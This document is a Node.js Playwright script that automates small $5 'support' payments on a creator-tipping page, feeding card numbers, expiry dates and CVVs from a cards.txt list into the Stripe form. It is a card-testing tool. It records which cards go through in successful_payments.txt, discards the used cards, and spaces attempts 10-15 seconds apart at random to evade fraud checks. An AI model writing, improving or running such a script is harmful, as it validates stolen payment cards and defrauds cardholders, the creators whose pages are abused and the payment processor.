const { chromium } = require('playwright');
const fs = require('fs');
const readline = require('readline');

// Function to read cards from cards.txt in the specified format
function readCardsFromFile(filePath) {
    const cards = [];
    const data = fs.readFileSync(filePath, 'utf8'); // Read file contents

    data.split('\n').forEach((line) => {
        const parts = line.split('|');
        if (parts.length === 4) {
            const card = {
                number: parts[0],
                expiry_month: parts[1],
                expiry_year: parts[2],
                cvv: parts[3]
            };
            cards.push(card);
        }
    });
    return cards;
}

// Function to save updated list of cards back to cards.txt
function saveCardsToFile(filePath, cards) {
    const data = cards.map(card => `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}`).join('\n');
    fs.writeFileSync(filePath, data, 'utf8');
}

// Function to log successful payments to a file
function logSuccessfulPayment(card) {
    const successfulCardInfo = `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}\n`;
    fs.appendFileSync('successful_payments.txt', successfulCardInfo);
}

// Automate the browser interaction
async function simulatePayment(card, influencerUrl, successName, gmailAddress) {
    const browser = await chromium.launch({
        headless: true,
        args: [
            '--enable-unsafe-swiftshader', // Enable unsafe swiftshader
            '--disable-web-security', // Disable web security including CSP
            '--allow-file-access-from-files' // Allow file access from local files (if needed)
        ]
    });
    const page = await browser.newPage();

    try {
        await page.goto(influencerUrl, { timeout: 60000 }); // Increase timeout

        await page.waitForSelector('text="Support $5"');
        await page.click('text="Support $5"');

        // Fill in email
        await page.fill('input[placeholder="Email"]', gmailAddress);
        await page.click('button:has-text("Pay")');

        await page.waitForTimeout(5000); // Wait for 5 seconds

        // Switch to the Stripe iframe
        const stripeFrame = await page.waitForSelector('iframe[name^="__privateStripeFrame"]', { timeout: 20000 });
        const frame = await stripeFrame.contentFrame();

        // Logging card details for debugging
        console.log(`Using card: ${card.number}, Expiry: ${card.expiry_month}/${card.expiry_year}, CVV: ${card.cvv}`);

        // Fill in credit card number
        await frame.waitForSelector('input[name="cardnumber"]', { timeout: 10000 });
        await frame.click('input[name="cardnumber"]');
        await frame.fill('input[name="cardnumber"]', card.number);

        // Fill in expiration date
        await frame.waitForSelector('input[name="exp-date"]', { timeout: 10000 });
        await frame.click('input[name="exp-date"]');
        await frame.fill('input[name="exp-date"]', `${card.expiry_month}/${card.expiry_year}`);

        // Fill in CVV
        await frame.waitForSelector('input[name="cvc"]', { timeout: 10000 });
        await frame.click('input[name="cvc"]');
        await frame.fill('input[name="cvc"]', card.cvv);

        // Check for ZIP code input
        const zipFieldVisible = await frame.isVisible('input[name="postal"]');
        if (zipFieldVisible) {
            await frame.click('input[name="postal"]');
            await frame.fill('input[name="postal"]', '100080'); // Fill in the default ZIP code
        }

        // Click "Pay with Card"
        await page.click('button:has-text("Pay with Card")');
        await page.waitForTimeout(15000); // Increased wait time

        // Check for response
        const bodyContent = await page.textContent('body');

        // Check for specific error messages
        if (bodyContent.includes("Your card number is incorrect.")) {
            await browser.close();
            return { success: false, reason: "Card number is incorrect" };
        }

        // Add check for card decline message
        if (bodyContent.includes("Your card was declined")) {
            await browser.close();
            return { success: false, reason: "Card was declined" };
        }

        // Check for authentication or card decline messages
        if (bodyContent.includes("We are unable to authenticate your payment method.") ||
            bodyContent.includes("Authentication Failed") ||
            bodyContent.includes("card declined")) {
            await browser.close();
            return { success: false, reason: "Card declined or authentication failed" };
        }

        // Success case: Payment completed
        if (await page.isVisible(`text="You bought ${successName} a coffee!"`)) {
            logSuccessfulPayment(card); // Log the successful payment
            await browser.close();
            return { success: true, reason: "Payment successful" };
        }

        // Default failure case if no success or failure messages are detected
        console.log(`Unknown failure occurred. Page content: \n${bodyContent}`); // Print page content for debugging
        await browser.close();
        return { success: false, reason: "Unknown failure" }; // Provide a generic reason for unknown failure
    } catch (error) {
        console.error(`Error during payment processing: ${error.message}`); // Log the error message
        await browser.close();
        return { success: false, reason: "Error during payment processing" }; // Provide a reason for processing errors
    }
}

// Main function to run the script
async function main() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    // Ask the user for the Gmail address and the success name
    rl.question('Enter your Gmail address: ', async (gmailAddress) => {
        rl.question('Enter the name that should appear in the success message (e.g., kuntal700): ', async (successName) => {
            rl.question('Enter the influencer URL: ', async (influencerUrl) => {
                let cards = readCardsFromFile('cards.txt'); // Read card details from cards.txt

                for (const card of cards) {
                    const result = await simulatePayment(card, influencerUrl, successName, gmailAddress);
                    // Show only the result of the payment
                    if (result.success) {
                        console.log(`✅ Payment successful: ${result.reason}`);
                    } else {
                        console.log(`❌ Payment failed: ${result.reason}`); // This will include the specific reason for failure
                    }

                    // Remove the used card from the list
                    cards = cards.filter(c => c.number !== card.number);
                    saveCardsToFile('cards.txt', cards); // Save the remaining cards

                    // Notify user if there are 50 or fewer cards left
                    if (cards.length === 50) {
                        console.log("⚠️ Warning: Only 50 cards remaining in cards.txt.");
                    }

                    // Trigger garbage collection after each card processing to free memory
                    if (global.gc) {
                        global.gc(); // Explicitly invoke garbage collection
                    }

                    // Wait for 10-15 seconds before processing the next card
                    const delay = Math.floor(Math.random() * 6) + 10; // Random delay between 10 and 15 seconds
                    await new Promise(resolve => setTimeout(resolve, delay * 1000));
                }

                rl.close();
            });
        });
    });
}

// Run the main function
main();

